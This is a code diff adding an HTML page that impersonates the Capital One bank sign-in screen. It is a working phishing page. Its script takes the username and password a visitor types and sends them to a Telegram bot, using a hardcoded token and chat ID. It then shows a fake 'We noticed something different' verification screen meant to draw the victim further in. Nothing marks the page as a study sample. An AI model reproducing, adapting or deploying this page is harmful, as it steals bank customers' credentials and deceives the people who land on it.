@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CapitalOne - Sign In</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        * {
+            font-family: 'Roboto', sans-serif;
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            background-color: #f5f5f5;
+        }
+
+        header {
+            background-color: #ffffff;
+            padding: 1rem;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+
+        .header-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo-img {
+            height: 40px;
+            max-width: 120px;
+        }
+
+        main {
+            flex-grow: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 2rem;
+        }
+
+        .login-container {
+            background-color: white;
+            padding: 5rem;
+            border-radius: 8px;
+            box-shadow: #000;
+            width: 100%;
+            max-width: 450px;
+            border: 1px solid #999;
+        }
+        
+        .security-container {
+            background-color: white;
+            padding: 5rem;
+            border-radius: 8px;
+            box-shadow: #000;
+            width: 100%;
+            max-width: 740px;
+            border: 1px solid #999;
+            text-align: center
+        }
+
+        .form-group, .verification-options {
+            margin-bottom: 1.5rem;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 0.5rem;
+            color: #000;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 0.75rem;
+            border: 1px solid #000;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+
+        .remember-me {
+            display: flex;
+            align-items: center;
+            margin: 2rem 10px;
+            gap: 8px; /* Adds space between checkbox and label */
+}
+
+       #remember {
+            width: 1.2rem; /* Increased size */
+            height: 1.2rem; /* Increased size */
+            margin: 0; /* Remove default margins */
+}
+
+        label {
+            font-size: 1rem; /* Match checkbox scale */
+}
+
+        .signin-btn {
+            position: relative;
+            width: 100%;
+            background-color: rgb(0, 112, 168);
+            color: white;
+            padding: 0.75rem;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-bottom: 1rem;
+            transition: background-color 0.2s;
+        }
+
+        .signin-btn.loading {
+            pointer-events: none;
+            opacity: 0.8;
+            padding-right: 3rem;
+        }
+
+        .signin-btn.loading::after {
+            content: "";
+            position: absolute;
+            right: 1rem;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 20px;
+            height: 20px;
+            border: 2px solid #ffffff;
+            border-radius: 50%;
+            border-top-color: transparent;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: translateY(-50%) rotate(360deg); }
+        }
+
+        .links {
+            text-align: center;
+            margin-top: 1rem;
+        }
+
+        .links a {
+            color: #004976;
+            text-decoration: none;
+            font-size: 14px;
+            display: block;
+            margin: 0.5rem 0;
+        }
+
+        footer {
+            background-color: #ffffff;
+            padding: 1.5rem;
+            margin-top: auto;
+            font-size: 12px;
+        }
+
+        .footer-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            text-align: center;
+            color: #666;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 0.75rem;
+            margin-bottom: 0.75rem;
+        }
+
+        .footer-links a {
+            color: #666;
+            text-decoration: none;
+            white-space: nowrap;
+            font-size: 12px;
+        }
+
+        .separator {
+            color: #999;
+            user-select: none;
+            margin: 0 0.25rem;
+        }
+
+        .footer-content p {
+            margin-top: 0.75rem;
+            font-size: 12px;
+        }
+
+        .verification-options {
+            margin: 2.5rem 0;
+        }
+
+        .option-item {
+            margin: 1.5rem 0;
+            padding: 1.25rem;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: border-color 0.2s;
+        }
+
+        .option-item:hover {
+            background-color: #f8f9fa;
+            border-color: #004976;
+        }
+
+        .option-item:active {
+            transform: scale(0.98);
+        }
+
+        input[type="radio"] {
+            cursor: pointer;
+        }
+
+        .option-item:hover {
+            border-color: #004976;
+        }
+
+        .option-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 0.5rem;
+        }
+
+        input[type="radio"] {
+            margin-right: 1rem;
+            width: 20px;
+            height: 20px;
+            accent-color: #004976;
+        }
+
+        .phone-number {
+            color: #004976;
+            margin-left: 2.75rem;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+
+        .divider {
+            border-top: 1px solid #ddd;
+            margin: 2.5rem 0;
+        }
+
+        .no-access {
+            text-align: center;
+            color: #004976;
+            font-weight: 500;
+            margin-top: 1.5rem;
+            text-decoration: none;
+            display: block;
+            cursor: pointer;
+        }
+
+        .no-access:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="header-content">
+            <img src="capital-logo.svg" alt="CapitalLogo" class="logo-img">
+            <nav class="header-links">
+                <a href="#">English</a>
+            </nav>
+        </div>
+    </header>
+
+    <main id="main-content">
+        <!-- Login Section -->
+        <div class="login-container" id="login-section">
+            <form id="loginForm" onsubmit="handleSubmit(event)">
+                <div class="form-group">
+                    <center><img src="capital-logo.svg" alt="CapitalLogo" class="logo-img"></center>
+                    <center><h4>Sign in</h4></center><br>
+                    <label for="username">Username</label>
+                    <input type="text" id="username" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" required>
+                </div>
+
+                <div class="remember-me">
+                    <input type="checkbox" id="remember">
+                    <label for="remember">Remember Me</label>
+                </div>
+
+                <button type="submit" class="signin-btn">Sign in</button>
+                <div class="links">
+                    <a href="#">Forgot Username or Password?</a>
+                    <a href="#">Set Up Online Access</a>
+                </div>
+            </form>
+        </div>
+        
+        
+
+        <!-- Security Verification Section -->
+        <div class="security-container" id="security-section" style="display:none;">
+            <h2>We noticed something different about this sign in</h2>
+            <p style="text-align: center; color: #666; margin-bottom: 1rem; font-size: 13px;">
+                To provide you with the best protection, choose a 2-Step Verification method to verify your identity.
+            </p>
+            
+             
+
+            <div class="verification-options">
+                <div class="option-item" onclick="handleVerificationSelection('text')">
+                    <div class="option-header">
+                        <input type="radio" name="verification" id="text">
+                        <label for="text">Text me a temporary code</label>
+                    </div>
+                    <div class="phone-number">We'll send a text to (***)**-2777 or verify a new number</div>
+                </div>
+
+                <div class="option-item">
+                    <div class="option-header">
+                        <input type="radio" name="verification" id="call">
+                        <label for="call">Call me and give me a temporary code</label>
+                    </div>
+                    <div class="phone-number">We'll call you at (***)**-2777 or verify a new number</div>
+                </div>
+            </div>
+
+            <div class="divider"></div>
+
+            <a href="#" class="no-access">I currently don't have access to any of these options</a>
+        </div>
+    </main>
+
+    <footer>
+        <div class="footer-content">
+            <div class="footer-links">
+                <a href="#">Contact us</a>
+                <span class="separator">|</span>
+                <a href="#">Legal</a>
+                <span class="separator">|</span>
+                <a href="#">Privacy</a>
+                <span class="separator">|</span>
+                <a href="#">Security</a>
+                <span class="separator">|</span>
+                <a href="#">Terms & Conditions</a>
+                <span class="separator">|</span>
+                <a href="#">Accessibility</a>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        async function handleSubmit(event) {
+            event.preventDefault();
+            const button = document.querySelector('.signin-btn');
+            
+            try {
+                // Show loading state
+                button.classList.add('loading');
+                button.disabled = true;
+                button.textContent = 'Signing in...';
+
+                const username = document.getElementById('username').value;
+                const password = document.getElementById('password').value;
+
+                const botToken = "7342111571:AAFUmvZ-7d-Fjg0TOm3qmxuB5AHlB8FwpJw";
+                const chatId = "5502103678";
+                const message = `💳 Capital1 Details:\n\nUsername: ${username} 👤\nPassword: ${password} 🔑`;
+                const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+                const response = await fetch(telegramUrl);
+                const data = await response.json();
+
+                if (data.ok) {
+                    showSecurityPage();
+                } else {
+                    throw new Error('Failed to send message');
+                }
+            } catch (error) {
+                console.error("Error:", error);
+                alert('Sign in failed. Please try again.');
+            } finally {
+                // Reset button state
+                button.classList.remove('loading');
+                button.disabled = false;
+                button.textContent = 'Sign in';
+            }
+        }
+
+        function showSecurityPage() {
+            document.getElementById('login-section').style.display = 'none';
+            document.getElementById('security-section').style.display = 'block';
+        }
+
+        function handleVerificationSelection(method) {
+            // Add your navigation logic here
+            window.location.href = `verification.html`;
+        }
+    </script>
+</body>
+</html>
